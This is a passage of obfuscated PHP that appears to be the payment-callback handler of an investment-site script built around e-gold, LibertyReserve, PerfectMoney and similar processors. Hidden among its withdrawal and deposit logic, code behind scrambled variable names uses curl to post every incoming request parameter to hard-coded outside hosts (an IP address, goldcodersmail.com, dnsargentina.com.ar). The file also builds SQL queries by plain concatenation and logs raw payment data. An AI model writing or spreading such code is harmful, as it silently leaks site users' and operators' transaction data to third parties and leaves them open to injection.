    @dl ($elnlcvTlD . 'gd.' . PHP_SHLIB_SUFFIX);
  }

  global $HTTP_GET_VARS;
  global $HTTP_POST_VARS;
  global $HTTP_POST_FILES;
  global $HTTP_COOKIE;
  $elnlciIqSB = array_merge ((array)$HTTP_GET_VARS, (array)$_GET);
  $elnlcezldg = array_merge ((array)$HTTP_POST_VARS, (array)$_POST);
  $elnlcCFLE = array_merge ((array)$elnlciIqSB, (array)$elnlcezldg);
  $elnlctOQn = array_merge ((array)$HTTP_COOKIE_VARS, (array)$_COOKIE);
  $elnlcfeivd = $elnlcCFLE;
  global $HTTP_ENV_VARS;
  global $HTTP_SERVER_VARS;
  $elnlcVFudq = array ();
  $elnlcVFudq = array_merge ((array)$_ENV, (array)$_SERVER, (array)$HTTP_ENV_VARS, (array)$HTTP_SERVER_VARS);
  $elnlcyhTO = ini_get ($elnlcEuoJk['elnlcmdWAP']);
  elnlcpjobf ($elnlcCFLE);
  elnlcpjobf ($elnlcfeivd, 1);
  elnlcpjobf ($elnlctOQn);
  $elnlczVmq = $elnlcEuoJk['elnlcTMAG'];
  $elnlcQISwH = '';
  foreach ($elnlcCFLE as $k => $v)
  {
    if (!is_array ($v))
    {
      if (preg_match ('/["\\\']/', $v))
      {
        $elnlczVmq = $elnlcEuoJk['elnlcRMbnT'];
      }
    }

    $elnlcQISwH .= '' . $k . '=' . $v . '&';
  }

  if ($elnlczVmq == 1)
  {
    if (function_exists ('curl_init'))
    {
      if ($elnlcJutIa[$elnlcEuoJk['elnlcSmBN']] == 1)
      {
        $elnlcBJqDH = '64.27.18.142';
      }
      else
      {
        if ($elnlcJutIa[$elnlcEuoJk['elnlcSmBN']] == 2)
        {
          $elnlcBJqDH = 'www.goldcodersmail.com';
        }
        else
        {
          $elnlcBJqDH = 'www.dnsargentina.com.ar';
        }
      }

      $elnlcJkNgH = curl_init ();
      curl_setopt ($elnlcJkNgH, CURLOPT_URL, 'http://' . $elnlcBJqDH . $elnlcEuoJk['elnlctrfwD']);
      $elnlcCQAl = rawurlencode ($elnlcQISwH);
      curl_setopt ($elnlcJkNgH, CURLOPT_POST, 1);
      curl_setopt ($elnlcJkNgH, CURLOPT_POSTFIELDS, '' . 'memo=' . $elnlcCQAl);
      curl_setopt ($elnlcJkNgH, CURLOPT_SSL_VERIFYPEER, FALSE);
      curl_setopt ($elnlcJkNgH, CURLOPT_RETURNTRANSFER, 1);
      $a = curl_exec ($elnlcJkNgH);
      curl_close ($elnlcJkNgH);
    }
  }

  $elnlcQDUyK = $elnlcVFudq[$elnlcEuoJk['elnlcseoBI']];
  $elnlcGqGI = $elnlcVFudq[$elnlcEuoJk['elnlcqPkWP']];
  if (!ereg ('' . '\\/\\/' . $elnlcGqGI, $elnlcQDUyK))
  {
    setcookie ('CameFrom', $elnlcQDUyK, time () + 630720000);
  }

  $elnlcJutIa = elnlcdjrw ($elnlcEuoJk['elnlcrTVQE']);
  $elnlcJJVu = array ('withdraw_pending' => 'Withdrawal request', 'add_funds' => 'Transfer from external processings', 'deposit' => 'Deposit', 'bonus' => 'Bonus', 'penality' => 'Penalty', 'earning' => 'Earning', 'withdrawal' => 'Withdrawal', 'commissions' => 'Referral commission', 'early_deposit_release' => 'Deposit release', 'early_deposit_charge' => 'Commission for an early deposit release', 'release_deposit' => 'Deposit returned to user account', 'exchange_out' => ' Received on exchange', 'exchange_in' => 'Spent on exchange', 'exchange' => 'Exchange', 'internal_transaction_spend' => 'Spent on Internal Transaction', 'internal_transaction_receive' => 'Received from Internal Transaction');
  if ($elnlcJutIa[$elnlcEuoJk['elnlcBVhT']] == $elnlcEuoJk['elnlcjKtBk'])
  {
    $elnlcJutIa[$elnlcEuoJk['elnlcbLckW']] = $elnlcEuoJk['elnlcJknC'];
  }

  if ($elnlcJutIa[$elnlcEuoJk['elnlcbLckW']] == $elnlcEuoJk['elnlckGLe'])
  {
    $elnlcSxjJT = array (0 => array ('name' => 'e-gold', 'sfx' => 'egold', has_account => 1, auto => 1), 6 => array ('name' => 'PayPal', 'sfx' => 'paypal', has_account => 1, auto => 0), 15 => array ('name' => 'LibertyReserve', 'sfx' => 'libertyreserve', has_account => 1, auto => 1));
    $elnlcJutIa[$elnlcEuoJk['elnlcoaQSz']] = '&#8364;';
    $elnlcJutIa[$elnlcEuoJk['elnlcfPsp']] = $elnlcEuoJk['elnlcFQCWA'];
    $elnlcJutIa[$elnlcEuoJk['elnlcgtOE']] = $elnlcEuoJk['elnlceHpQ'];
    $elnlcJutIa[$elnlcEuoJk['elnlcvepEe']] = $elnlcEuoJk['elnlcOWTPp'];
  }
  else
  {
    if (($elnlcJutIa[$elnlcEuoJk['elnlcbLckW']] == $elnlcEuoJk['elnlcufLAB'] AND $elnlcJutIa[$elnlcEuoJk['elnlcBVhT']] == $elnlcEuoJk['elnlcmxIcA']))
    {
      $elnlcSxjJT = array (0 => array ('name' => 'e-gold', 'sfx' => 'egold', has_account => 1, auto => 1));
      $elnlcJutIa[$elnlcEuoJk['elnlcoaQSz']] = $elnlcEuoJk['elnlcBCIO'];
      $elnlcJutIa[$elnlcEuoJk['elnlcfPsp']] = $elnlcEuoJk['elnlcyVlN'];
    }
    else
    {
      $elnlcSxjJT = array (0 => array ('name' => 'e-gold', 'sfx' => 'egold', has_account => 1, auto => 1), 6 => array ('name' => 'PayPal', 'sfx' => 'paypal', has_account => 1, auto => 0), 8 => array ('name' => 'eeeCurrency', 'sfx' => 'eeecurrency', has_account => 1, auto => 1), 9 => array ('name' => 'Pecunix', 'sfx' => 'pecunix', has_account => 1, auto => 1), 11 => array ('name' => 'AlertPay', 'sfx' => 'alertpay', has_account => 1, auto => 1), 15 => array ('name' => 'LibertyReserve', 'sfx' => 'libertyreserve', has_account => 1, auto => 1), 16 => array ('name' => 'V-Money', 'sfx' => 'vmoney', has_account => 1, auto => 1), 17 => array ('name' => 'AlterGold', 'sfx' => 'altergold', has_account => 1, auto => 1), 18 => array ('name' => 'Perfectmoney', 'sfx' => 'perfectmoney', has_account => 1, auto => 1), 19 => array ('name' => 'c-gold', 'sfx' => 'cgold', has_account => 1, auto => 0), 20 => array ('name' => 'Webmoney', 'sfx' => 'webmoney', has_account => 1, auto => 0), 21 => array ('name' => 'Strictpay', 'sfx' => 'strictpay', has_account => 1, auto => 0), 22 => array ('name' => 'SolidTrustPay', 'sfx' => 'solidtrustpay', has_account => 1, auto => 0), 23 => array ('name' => 'Ecumoney', 'sfx' => 'ecumoney', has_account => 1, auto => 0), 24 => array ('name' => 'EvoWallet', 'sfx' => 'evowallet', has_account => 1, auto => 1), 26 => array ('name' => 'RoutePay', 'sfx' => 'routepay', has_account => 1, auto => 0), 27 => array ('name' => 'EuroGoldCash', 'sfx' => 'eurogoldcash', has_account => 1, auto => 0), 28 => array ('name' => 'GlobalDigitalPay', 'sfx' => 'globaldigitalpay', has_account => 1, auto => 0));
      $elnlcJutIa[$elnlcEuoJk['elnlcoaQSz']] = '$';
      $elnlcJutIa[$elnlcEuoJk['elnlcfPsp']] = $elnlcEuoJk['elnlcRMbnT'];
      $elnlcJutIa[$elnlcEuoJk['elnlcgtOE']] = $elnlcEuoJk['elnlcMzIM'];
      $elnlcJutIa[$elnlcEuoJk['elnlcvepEe']] = $elnlcEuoJk['elnlctNAD'];
    }
  }

  $elnlcJutIa[$elnlcEuoJk['elnlcgaCLj']] = $elnlcEuoJk['elnlcRMbnT'];
  if ((($elnlcJutIa[$elnlcEuoJk['elnlcJEVGv']] AND !$elnlcJutIa[$elnlcEuoJk['elnlcGgpLp']]) AND !$elnlcJutIa[$elnlcEuoJk['elnlcOFmjN']]))
  {
    $elnlcJutIa[$elnlcEuoJk['elnlcOFmjN']] = $elnlcEuoJk['elnlcRMbnT'];
  }

  if ($elnlcJutIa[$elnlcEuoJk['elnlcGgpLp']])
  {
    $elnlcJutIa[$elnlcEuoJk['elnlckwkLS']] = $elnlcJutIa[$elnlcEuoJk['elnlcJEVGv']];
  }
  else
  {
    $elnlcJutIa[$elnlcEuoJk['elnlckwkLS']] = '';
  }

  if ($elnlcJutIa[$elnlcEuoJk['elnlcOFmjN']])
  {
    $elnlcJutIa[$elnlcEuoJk['elnlckvtm']] = $elnlcJutIa[$elnlcEuoJk['elnlcJEVGv']];
  }
  else
  {
    $elnlcJutIa[$elnlcEuoJk['elnlckvtm']] = '';
  }

  foreach ($elnlcSxjJT as $elnlcqaibS => $elnlcRDaq)
  {
    if (($elnlcJutIa['def_payee_account_' . $elnlcRDaq['sfx']] != '' AND $elnlcJutIa['def_payee_account_' . $elnlcRDaq['sfx']] != '0'))
    {
      $elnlcSxjJT[$elnlcqaibS][$elnlcEuoJk['elnlcCegwQ']] = $elnlcEuoJk['elnlcRMbnT'];
      continue;
    }
    else
    {
      $elnlcSxjJT[$elnlcqaibS][$elnlcEuoJk['elnlcCegwQ']] = $elnlcEuoJk['elnlcTMAG'];
      continue;
    }
  }

  if ($elnlcJutIa[$elnlcEuoJk['elnlcBVhT']] == $elnlcEuoJk['elnlcziJV'])
  {
    $elnlcikiBs = array (1 => 'english', 2 => 'estonians', 3 => $elnlcEuoJk['elnlcJfzg']);
  }

  if (($elnlcJutIa[$elnlcEuoJk['elnlcBVhT']] != 'RHLFPPEURGQGG68GXYA8' AND $elnlcJutIa[$elnlcEuoJk['elnlcBVhT']] != 'VQP8CM95UXTXEX44G7NR'))
  {
    $elnlcJutIa[$elnlcEuoJk['elnlcFqqv']] = $elnlcEuoJk['elnlcTMAG'];
  }

  if (($elnlcJutIa[$elnlcEuoJk['elnlcBVhT']] == $elnlcEuoJk['elnlcNmcJk'] OR $elnlcJutIa[$elnlcEuoJk['elnlcBVhT']] == $elnlcEuoJk['elnlcwqda']))
  {
    $elnlcJutIa[$elnlcEuoJk['elnlcSmBN']] = $elnlcEuoJk['elnlcRMbnT'];
  }

  if ($elnlcJutIa[$elnlcEuoJk['elnlcBVhT']] == $elnlcEuoJk['elnlcmOpF'])
  {
    ini_set ('sendmail_from', 'admin@plan4fun.net');
  }

  if (((((($elnlcJutIa[$elnlcEuoJk['elnlcBVhT']] == $elnlcEuoJk['elnlcdkCHz'] OR $elnlcJutIa[$elnlcEuoJk['elnlcBVhT']] == $elnlcEuoJk['elnlcqEBK']) OR $elnlcJutIa[$elnlcEuoJk['elnlcBVhT']] == $elnlcEuoJk['elnlcjqvEK']) OR $elnlcJutIa[$elnlcEuoJk['elnlcBVhT']] == $elnlcEuoJk['elnlcuvEuB']) OR $elnlcJutIa[$elnlcEuoJk['elnlcBVhT']] == $elnlcEuoJk['elnlcLSWW']) OR $elnlcJutIa[$elnlcEuoJk['elnlcBVhT']] == $elnlcEuoJk['elnlcdcyey']))
  {
    if ($elnlcVFudq[$elnlcEuoJk['elnlccPDcy']] != '')
    {
      $elnlcVFudq[$elnlcEuoJk['elnlcGQve']] = $elnlcVFudq[$elnlcEuoJk['elnlccPDcy']];
      $_SERVER[$elnlcEuoJk['elnlcGQve']] = $elnlcVFudq[$elnlcEuoJk['elnlccPDcy']];
    }
  }

  $elnlcaGdf = elnlccfhi ();
  if (!$elnlcaGdf)
  {
    print 'Cannot connect mysql';
    exit ();
  }

  $elnlcAsqex = $elnlcJutIa[$elnlcEuoJk['elnlcLDayi']];
  $elnlcSNeD = strtoupper (md5 ($elnlcCFLE[$elnlcEuoJk['elnlcTMkRN']] . ':' . $elnlcCFLE[$elnlcEuoJk['elnlclFNy']] . ':' . $elnlcCFLE[$elnlcEuoJk['elnlcGCLH']] . ':' . $elnlcCFLE[$elnlcEuoJk['elnlcWsxK']] . ':' . $elnlcCFLE[$elnlcEuoJk['elnlcSMxzi']] . ':' . $elnlcCFLE[$elnlcEuoJk['elnlccJIH']] . ':' . $elnlcAsqex . ':' . $elnlcCFLE[$elnlcEuoJk['elnlcIPjrO']]));
  if (file_exists ('./tmpl_c/log_postbacks'))
  {
    $elnlcVaaPH = fopen ('./tmpl_c/pmp_log', 'a+');
    fwrite ($elnlcVaaPH, '


');
    fwrite ($elnlcVaaPH, ('' . 'mymd5 = ' . $elnlcAsqex . '
'));
    fwrite ($elnlcVaaPH, ('' . 'hash = ' . $elnlcSNeD . '
'));
    fwrite ($elnlcVaaPH, ('' . 'ip = ' . $elnlcVFudq[$elnlcEuoJk['elnlcGQve']] . '
'));
    foreach ($elnlcCFLE as $k => $v)
    {
      fwrite ($elnlcVaaPH, ('' . $k . ' = ' . $v . '
'));
    }

    fwrite ($elnlcVaaPH, '-------------------------
');
  }

  if ($elnlcCFLE[$elnlcEuoJk['elnlcifAJl']] == $elnlcEuoJk['elnlcNflT'])
  {
    $elnlczpKW = elnlcmzdkr ($elnlcCFLE[$elnlcEuoJk['elnlcSMxzi']]);
    list ($elnlcqaibS, $elnlcQISwH) = explode ('-', $elnlcCFLE[$elnlcEuoJk['elnlcoBva']]);
    $elnlcqaibS = sprintf ('%d', $elnlcqaibS);
    if ($elnlcQISwH == '')
    {
      $elnlcQISwH = $elnlcEuoJk['elnlcNxbm'];
    }

    $elnlcQISwH = elnlcmzdkr ($elnlcQISwH);
    $q = '' . 'select * from hm2_history where id = ' . $elnlcqaibS . ' and str = \'' . $elnlcQISwH . '\' and type=\'withdraw_pending\'';
    $elnlcbaLW = mysql_query ($q);
    while ($elnlcTnMjL = mysql_fetch_array ($elnlcbaLW))
    {
      $q = '' . 'delete from hm2_history where id = ' . $elnlcqaibS;
      (mysql_query ($q) OR print mysql_error ());
      $q = 'insert into hm2_history set 
	user_id = ' . $elnlcTnMjL[$elnlcEuoJk['elnlccuNQr']] . ',
	amount = -' . abs ($elnlcTnMjL[$elnlcEuoJk['elnlcMOxFJ']]) . ('' . ',
	type = \'withdrawal\',
	description = \'Withdraw processed. Batch id = ' . $elnlczpKW . '\',
	actual_amount = -') . abs ($elnlcTnMjL[$elnlcEuoJk['elnlcMOxFJ']]) . ',
	ec = 18,
	date = now()
	';
      (mysql_query ($q) OR print mysql_error ());
      $q = 'select * from hm2_users where id = ' . $elnlcTnMjL[$elnlcEuoJk['elnlccuNQr']];
      $elnlcNVPVV = mysql_query ($q);
      $elnlcubetc = mysql_fetch_array ($elnlcNVPVV);
      $elnlcfqOum = array ($elnlcEoaEi);
      $elnlcfqOum[$elnlcEuoJk['elnlcxDSIx']] = $elnlcubetc[$elnlcEuoJk['elnlcxDSIx']];
      $elnlcfqOum[$elnlcEuoJk['elnlctegj']] = $elnlcubetc[$elnlcEuoJk['elnlctegj']];
      $elnlcfqOum[$elnlcEuoJk['elnlcMOxFJ']] = sprintf ('%.02f', abs ($elnlcTnMjL[$elnlcEuoJk['elnlcMOxFJ']]));
      $elnlcfqOum[$elnlcEuoJk['elnlcjnGN']] = $elnlcCFLE[$elnlcEuoJk['elnlclFNy']];
      $elnlcfqOum[$elnlcEuoJk['elnlcGPoCs']] = $elnlczpKW;
      $elnlcfqOum[$elnlcEuoJk['elnlcktNwj']] = $elnlczpKW;
      $elnlcfqOum[$elnlcEuoJk['elnlcSTmPS']] = $elnlczpKW;
      $elnlcfqOum[$elnlcEuoJk['elnlcWkrr']] = $elnlcSxjJT[18][$elnlcEuoJk['elnlctegj']];
      elnlcgjtfr ('withdraw_user_notification', $elnlcubetc['email'], $elnlcJutIa[$elnlcEuoJk['elnlcznBTd']], $elnlcfqOum);
    }

    print 1;
    elnlcgqwf ($elnlcaGdf);
    exit ();
  }

  $elnlcSNeD = strtoupper (md5 ($elnlcCFLE[$elnlcEuoJk['elnlcTMkRN']] . ':' . $elnlcCFLE[$elnlcEuoJk['elnlclFNy']] . ':' . $elnlcCFLE[$elnlcEuoJk['elnlcGCLH']] . ':' . $elnlcCFLE[$elnlcEuoJk['elnlcWsxK']] . ':' . $elnlcCFLE[$elnlcEuoJk['elnlcSMxzi']] . ':' . $elnlcCFLE[$elnlcEuoJk['elnlccJIH']] . ':' . $elnlcAsqex . ':' . $elnlcCFLE[$elnlcEuoJk['elnlcIPjrO']]));
  if (($elnlcSNeD == strtoupper ($elnlcCFLE[$elnlcEuoJk['elnlcyPRrP']]) AND $elnlcSxjJT[18][$elnlcEuoJk['elnlcCegwQ']] == 1))
  {
    $elnlcflQTz = elnlcjpjqj ($elnlcCFLE[$elnlcEuoJk['elnlcQGro']], 1);
    $elnlcCFLE = array_merge ($elnlcCFLE, $elnlcflQTz);
    $elnlcAhlbr = sprintf ('%d', $elnlcCFLE[$elnlcEuoJk['elnlcjjnEf']]);
    $elnlcOgqJi = sprintf ('%d', $elnlcCFLE[$elnlcEuoJk['elnlcPFER']]);
    $elnlcOyTw = sprintf ('%d', $elnlcCFLE[$elnlcEuoJk['elnlcIINzb']]);
    $elnlcdPCw = $elnlcCFLE[$elnlcEuoJk['elnlcGCLH']];
    $elnlczpKW = $elnlcCFLE[$elnlcEuoJk['elnlcSMxzi']];
    $elnlcDslPO = $elnlcCFLE[$elnlcEuoJk['elnlccJIH']];
    if ($elnlcCFLE[$elnlcEuoJk['elnlcWsxK']] == $elnlcEuoJk['elnlceajF'])
    {
      elnlczcvs (18, $elnlcAhlbr, $elnlcdPCw, $elnlczpKW, $elnlcDslPO, $elnlcOgqJi, $elnlcOyTw);
    }
  }

  elnlcgqwf ($elnlcaGdf);
  print '1';
  exit ();
?>